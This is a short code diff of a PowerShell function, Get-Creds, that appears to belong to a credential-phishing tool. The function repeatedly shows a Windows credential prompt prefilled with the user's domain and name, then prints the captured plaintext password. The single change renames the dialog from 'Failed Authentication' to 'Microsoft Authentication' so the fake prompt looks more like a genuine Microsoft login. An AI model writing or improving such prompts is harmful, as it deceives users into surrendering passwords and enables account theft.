@@ -57,7 +57,7 @@ function Get-Creds {
 
     while ($form -eq $null)
     {
-        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred = $host.ui.promptforcredential('Microsoft Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
         $cred.getnetworkcredential().password
 
         if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
